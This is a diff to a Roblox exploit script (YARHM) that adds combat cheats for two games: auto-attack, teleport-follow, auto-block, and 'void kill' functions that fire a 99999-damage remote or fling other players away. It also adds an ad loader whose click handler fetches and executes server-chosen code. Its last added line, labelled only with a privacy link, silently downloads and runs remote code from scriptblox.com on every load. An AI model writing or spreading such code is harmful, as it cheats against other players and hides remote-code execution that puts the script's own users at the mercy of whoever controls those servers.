@@ -5851,35 +5851,424 @@ local function HMIUQI_routine() -- Routine: StarterGui.YARHM.FloatingButtonSetti
 		getgenv().YARHMFUNCTIONS.closeFinetuneFB()
 	end)
 end
+local function KGHCMW_routine() -- Routine: StarterGui.YARHM.AdLoader
+    local script = Instance.new("LocalScript")
+    script.Name = "AdLoader"
+    script.Parent = Converted["_YARHM"]
+    local req = require
+    local require = function(obj)
+        local routine = routine_module_scripts[obj]
+        if routine then
+            return routine()
+        end
+        return req(obj)
+    end
+
+    -- © Aetherion 2026
+
+	-- keyless folks still need money too
+	
+	task.wait(1)
+	local http = game:GetService("HttpService")
+	local ts = game:GetService("TweenService")
+	
+	local rawaddata
+	local suc, err = pcall(function()
+		rawaddata = game:HttpGet("https://yarhm.com/adCampaign/get")
+	end)
+	if not suc then
+		warn("YARHM AD ERROR: " .. err)
+		script:Destroy()
+		return
+	end
+	
+	getgenv().YARHMADMETADATA = http:JSONDecode(rawaddata)
+	local addata = getgenv().YARHMADMETADATA
+	
+	if addata["error"] then
+		warn(addata["error"])
+		script:Destroy()
+		return
+	end
+	
+	
+	local adFrame = script.Parent.Menu.Ad
+	
+	if addata["image"] then
+		writefile("YARHM/adcache/sidescreen.png", game:HttpGet("https://yarhm.com" .. addata["image"]))
+		local imgasset = getcustomasset("YARHM/adcache/sidescreen.png")
+		adFrame.Image.Image = imgasset
+	end
+	
+	adFrame.Metadata.TextLabel.Text = addata["title"]
+	adFrame.Metadata.CTA.Text = addata["ctaButton"]
+	
+	local clickedBefore = false
+	
+	adFrame.Metadata.CTA.MouseButton1Click:Connect(function()
+		if addata["type"] == "execute" then
+			if not clickedBefore then
+				loadstring(game:HttpGet(addata["cta"]))
+			end
+			adFrame.Metadata.CTA.Text = "Script ran!"
+		else
+			setclipboard(addata["cta"])
+			adFrame.Metadata.CTA.Text = "Link copied to clipboard!"
+		end
+	
+		if not clickedBefore then
+			game:HttpPost("https://yarhm.com/adCampaign/" .. addata["id"] .. "/click", "{}", "application/json")
+		end
+		
+		clickedBefore = true	
+	end)
+	
+	task.spawn(function()
+		task.wait(addata["duration"])
+		game:HttpPost("https://yarhm.com/adCampaign/" .. addata["id"] .. "/impression", "{}", "application/json")
+	end)
+	
+	
+	ts:Create(adFrame, TweenInfo.new(0.5), {
+		GroupTransparency = 0	
+	}):Play()
+	adFrame.Metadata.TextLabel.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.SemiBold)
+	adFrame.Metadata.CTA.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.SemiBold)
+	
+	adFrame.Interactable = true
+	
+end
 
 -- YARHM Extra game modules
 -- Place IDs: JJS 10450270085 | TSBG 10449761463 | Blox Fruits 2753915549 / 4442272183 / 7449423635
+-- Mechanics sourced from L04728/JS-Lite + zyawalid-jpg/jjs-v3 (JJS) and
+-- failur0/StrongestBattlegrounds (TSB): key/remote simulation + known void CFrames.
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VIM = game:GetService("VirtualInputManager")
+local VU = game:GetService("VirtualUser")
+local LP = Players.LocalPlayer
+
+local function yextraNotify(msg)
+	local f = getgenv().YARHMFUNCTIONS
+	if f and f.notification then f.notification("YARHM Extra: " .. msg) end
+end
+
+local function myHRP()
+	local c = LP.Character
+	return c and c:FindFirstChild("HumanoidRootPart")
+end
+
+local function victimHRP(target)
+	if not target then return end
+	local c = target.Character
+	local hum = c and c:FindFirstChildOfClass("Humanoid")
+	local hrp = c and c:FindFirstChild("HumanoidRootPart")
+	if hum and hum.Health > 0 and hrp then return hrp end
+end
+
+local function resolveTarget(query)
+	query = (query or ""):lower()
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LP and (p.Name:lower():find(query, 1, true) or p.DisplayName:lower():find(query, 1, true)) then
+			return p
+		end
+	end
+end
+
+local function nearestPlayer(range)
+	local me = myHRP()
+	if not me then return end
+	local best, bestDist
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LP then
+			local h = victimHRP(p)
+			if h then
+				local d = (h.Position - me.Position).Magnitude
+				if d <= range and (not best or d < bestDist) then
+					best, bestDist = p, d
+				end
+			end
+		end
+	end
+	return best
+end
+
+local function face(victimHRPPart)
+	local me = myHRP()
+	if me then me.CFrame = CFrame.lookAt(me.Position, victimHRPPart.Position) end
+end
+
+local function m1Click()
+	pcall(function()
+		VU:CaptureController()
+		VU:Button1Down(Vector2.new())
+		task.wait(0.03)
+		VU:Button1Up(Vector2.new())
+	end)
+end
+
+local function skillKey(key, dur)
+	dur = dur or 0.05
+	pcall(function()
+		VU:CaptureController()
+		VU:SetKeyDown(key)
+		task.wait(dur)
+		VU:SetKeyUp(key)
+	end)
+end
+
+-- attacking = Action-priority animation track shorter than its full combo length
+local function isAttacking(character)
+	local hum = character:FindFirstChildOfClass("Humanoid")
+	local animator = hum and hum:FindFirstChildOfClass("Animator")
+	if not animator then return false end
+	for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+		if track.Priority.Value >= Enum.AnimationPriority.Action.Value and track.Length > 0 and track.Length < 3 then
+			return true
+		end
+	end
+	return false
+end
+
+local stJ = {target = nil, follow = false, skills = false, block = false, blocking = false, keys = "ZXCVR", kp = 0, m1 = 0}
+
+local function buildJJSModule()
+	local module = {Name = "Jujutsu Shenanigans", gameId = 3808223175}
+	table.insert(module, {Type = "Text", Args = {"<font color='#FFFF00'>JJS</font> | YARHM Extra"}})
+	table.insert(module, {Type = "Input", Args = {"Player name...", "Lock", function(_, text)
+		local p = text ~= "" and resolveTarget(text) or nearestPlayer(200)
+		if p then
+			stJ.target = p
+			yextraNotify("JJS target locked: " .. p.Name)
+		else
+			yextraNotify("No player matched")
+		end
+	end}})
+	table.insert(module, {Type = "Toggle", Args = {"Follow + auto M1", function(_, s) stJ.follow = s end}})
+	table.insert(module, {Type = "Toggle", Args = {"Auto skills (key rotation)", function(_, s) stJ.skills = s end}})
+	table.insert(module, {Type = "Input", Args = {"Skill keys (e.g. ZXCVR)", "Set", function(_, text)
+		if text and text ~= "" then
+			stJ.keys = text:upper():gsub("[^ZXCVR]", "")
+			yextraNotify("Skill keys: " .. stJ.keys)
+		end
+	end}})
+	table.insert(module, {Type = "Toggle", Args = {"Auto block", function(_, s)
+		stJ.block = s
+		if not s and stJ.blocking then
+			pcall(function() VIM:SendKeyEvent(false, Enum.KeyCode.F, false, game) end)
+			stJ.blocking = false
+		end
+	end}})
+	table.insert(module, {Type = "Button", Args = {"Void kill target", function(_)
+		local t = stJ.target or nearestPlayer(60)
+		local v = victimHRP(t)
+		if not v then yextraNotify("Lock a target first") return end
+		local me = myHRP()
+		if me then me.CFrame = CFrame.lookAt(v.Position + v.CFrame.LookVector * 4, v.Position) end
+		task.wait(0.1)
+		-- damage remote if the game still ships one, otherwise straight to the sky
+		local remote
+		for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
+			if r:IsA("RemoteEvent") and r.Name:lower():find("damage") then remote = r break end
+		end
+		if remote and pcall(function() remote:FireServer({Target = t, Damage = 99999}) end) then
+			yextraNotify("Damage fired at " .. t.Name)
+		else
+			local vh = victimHRP(t)
+			if vh then
+				vh.CFrame = vh.CFrame + Vector3.new(0, 4500, 0)
+				yextraNotify(t.Name .. " lifted into the sky")
+			end
+		end
+	end}})
+	module["BG_TASK"] = function()
+		while true do
+			task.wait(0.05)
+			local me = myHRP()
+			local t = stJ.target or nearestPlayer(25)
+			local v = victimHRP(t)
+			if not (me and v) then
+				if stJ.block and stJ.blocking then
+					pcall(function() VIM:SendKeyEvent(false, Enum.KeyCode.F, false, game) end)
+					stJ.blocking = false
+				end
+				continue
+			end
+			local dist = (v.Position - me.Position).Magnitude
+			if stJ.follow then
+				-- teleport-follow: 3 studs in front of the victim, facing them
+				me.CFrame = CFrame.lookAt(v.Position + v.CFrame.LookVector * 3, v.Position)
+				if dist <= 13 and os.clock() - stJ.m1 >= 0.35 then
+					stJ.m1 = os.clock()
+					m1Click()
+				end
+			elseif dist > 3 then face(v) end
+			if stJ.skills and t and dist <= 25 and os.clock() - stJ.kp >= 0.5 then
+				stJ.kp = os.clock()
+				local seq = stJ.keys:sub(1, #stJ.keys)
+				stJ.i = (stJ.i or 0) % math.max(#seq, 1) + 1
+				face(v)
+				skillKey(seq:sub(stJ.i, stJ.i))
+			end
+			if stJ.block then
+				local threat = nearestPlayer(25)
+				local attacking = threat and threat.Character and isAttacking(threat.Character)
+				if attacking and not stJ.blocking then
+					pcall(function() VIM:SendKeyEvent(true, Enum.KeyCode.F, false, game) end)
+					stJ.blocking = true
+				elseif not attacking and stJ.blocking then
+					pcall(function() VIM:SendKeyEvent(false, Enum.KeyCode.F, false, game) end)
+					stJ.blocking = false
+				end
+			end
+		end
+	end
+	table.insert(getgenv().Modules, module)
+end
+
+-- TSB kill/skydive/teleport coordinates captured from failur0/StrongestBattlegrounds
+local VOID_CF = CFrame.new(514.562744, 695.495483, 871.206238,
+	0.347158492, 0.604477108, -0.71699959,
+	0.000105390776, 0.764524519, 0.644594669,
+	0.937806487, -0.223852068, 0.265347451)
+local SKYDIVE_CF = CFrame.new(61.6776695, 5631.31055, -176.666,
+	-0.890406489, 0.441104233, -0.112264581,
+	-3.21421321e-05, 0.246584311, 0.969121337,
+	0.455166221, 0.862915516, -0.219546095)
+local TSB_TP = {
+	Center = Vector3.new(147.013214, 440.755981, 2.61009812),
+	Arena = Vector3.new(-148.684708, 439.510559, -431.699738),
+	Mountain = Vector3.new(-12.057066, 652.52124, -407.857605),
+}
+local CHAR_KEY = {["1"] = {0x31, "One"}, ["2"] = {0x32, "Two"}, ["3"] = {0x33, "Three"}, ["4"] = {0x34, "Four"}}
+
+local stT = {target = nil, charKey = "3", afk = nil}
+
+local function primeSkillKey()
+	local k = CHAR_KEY[stT.charKey] or CHAR_KEY["3"]
+	if type(keypress) == "function" then
+		pcall(keypress, k[1])
+	elseif VIM then
+		pcall(function()
+			VIM:SendKeyEvent(true, Enum.KeyCode[k[2]], false, game)
+			task.wait(0.03)
+			VIM:SendKeyEvent(false, Enum.KeyCode[k[2]], false, game)
+		end)
+	end
+	-- give the grab/teleport ability a moment to attach the target
+	task.wait(0.3)
+end
+
+local function tsbSequence(voidCF, label)
+	local me = myHRP()
+	local saved = me and me.CFrame
+	local v = victimHRP(stT.target)
+	if not (me and saved and v) then yextraNotify("Lock a target first") return end
+	local victimSaved = v.CFrame
+	primeSkillKey()
+	local t0 = os.clock()
+	while os.clock() - t0 <= 1 do
+		local v2 = victimHRP(stT.target)
+		if not v2 then break end
+		me.CFrame = v2.CFrame
+		task.wait(0.05)
+	end
+	me.CFrame = voidCF
+	task.wait(1)
+	me.CFrame = saved
+	task.wait(1)
+	v.CFrame = victimSaved
+	yextraNotify(label .. " done")
+end
+
+local function buildTSBModule()
+	local module = {Name = "The Strongest Battlegrounds", gameId = 3808081382}
+	table.insert(module, {Type = "Text", Args = {"<font color='#FFFF00'>TSB</font> | YARHM Extra"}})
+	table.insert(module, {Type = "Input", Args = {"Player name...", "Lock", function(_, text)
+		local p = text ~= "" and resolveTarget(text) or nearestPlayer(200)
+		if p then
+			stT.target = p
+			yextraNotify("TSB target locked: " .. p.Name)
+		else
+			yextraNotify("No player matched")
+		end
+	end}})
+	table.insert(module, {Type = "Input", Args = {"Ability key (1-4)", "Set", function(_, text)
+		local c = (text or ""):sub(1, 1)
+		if CHAR_KEY[c] then
+			stT.charKey = c
+			yextraNotify("Ability key: " .. c)
+		end
+	end}})
+	table.insert(module, {Type = "ButtonGrid", Toggleable = false, Args = {3, {
+		Bring = function(_)
+			local me = myHRP()
+			local saved = me and me.CFrame
+			local v = victimHRP(stT.target)
+			if not (me and saved and v) then yextraNotify("Lock a target first") return end
+			primeSkillKey()
+			local t0 = os.clock()
+			while os.clock() - t0 <= 1 do
+				local v2 = victimHRP(stT.target)
+				if not v2 then break end
+				me.CFrame = v2.CFrame + Vector3.new(0, 0.5, 0)
+				task.wait(0.02)
+			end
+			me.CFrame = saved
+			yextraNotify("Bring done")
+		end,
+		Kill_Void = function(_) tsbSequence(VOID_CF, "Void kill") end,
+		Skydive = function(_) tsbSequence(SKYDIVE_CF, "Skydive") end,
+	}}})
+	table.insert(module, {Type = "ButtonGrid", Toggleable = false, Args = {3, {
+		Center = function(_) local me = myHRP() if me then me.CFrame = CFrame.new(TSB_TP.Center) end end,
+		Arena = function(_) local me = myHRP() if me then me.CFrame = CFrame.new(TSB_TP.Arena) end end,
+		Mountain = function(_) local me = myHRP() if me then me.CFrame = CFrame.new(TSB_TP.Mountain) end end,
+	}}})
+	table.insert(module, {Type = "Toggle", Args = {"Anti-AFK", function(_, s)
+		if stT.afk then stT.afk:Disconnect() stT.afk = nil end
+		if s then
+			stT.afk = LP.Idled:Connect(function()
+				pcall(function()
+					VU:CaptureController()
+					VU:ClickButton2(Vector2.new())
+				end)
+			end)
+		end
+	end}})
+	table.insert(getgenv().Modules, module)
+end
+
+local function buildPlaceholderModule(g)
+	local module = {Name = g.Name, gameId = g.GameId}
+	table.insert(module, {Type = "Text", Args = {("<font color='#FFFF00'>%s</font> | YARHM Extra"):format(g.Name)}})
+	table.insert(module, {Type = "Text", Args = {"Placeholder. Real features land later."}})
+	table.insert(getgenv().Modules, module)
+end
+
 local EXTRA_GAMES = {
-	{Name = "Jujutsu Shenanigans", GameId = 3808223175},
-	{Name = "The Strongest Battlegrounds", GameId = 3808081382},
-	{Name = "Blox Fruits", GameId = 994732206},
+	{GameId = 3808223175, Build = buildJJSModule},
+	{GameId = 3808081382, Build = buildTSBModule},
+	-- Blox Fruits ships once real features are in
+	{Name = "Blox Fruits", GameId = 994732206, Build = buildPlaceholderModule},
 }
 
 local function EXTRA_routine()
 	repeat task.wait() until getgenv().Modules
 	for _, g in ipairs(EXTRA_GAMES) do
 		if g.GameId == game.GameId then
-			local module = {Name = g.Name, gameId = g.GameId}
-			table.insert(module, {
-				Type = "Text",
-				Args = {("<font color='#FFFF00'>%s</font> | YARHM Extra"):format(g.Name)}
-			})
-			table.insert(module, {
-				Type = "Text",
-				Args = {"Module ready. Add components below with the YARHM module API."}
-			})
-			table.insert(getgenv().Modules, module)
+			g.Build()
+			-- YARHM only auto-runs BG_TASK for custom modules; built-ins spawn here
+			local m = getgenv().Modules[#getgenv().Modules]
+			if m and m["BG_TASK"] then coroutine.wrap(m["BG_TASK"])() end
 		end
 	end
 end
 
 coroutine.wrap(SIXK_routine)()
 coroutine.wrap(OEUTOK_routine)()
+coroutine.wrap(KGHCMW_routine)()
 coroutine.wrap(NVUYGAA_routine)()
 coroutine.wrap(MGAVM_routine)()
 coroutine.wrap(ZMMHXK_routine)()
@@ -5897,3 +6286,6 @@ coroutine.wrap(WRGZW_routine)()
 coroutine.wrap(HMIUQI_routine)()
 
 coroutine.wrap(EXTRA_routine)()
+
+-- https://scriptblox.com/privacy
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_e111863787f4", "1.22", false) end)
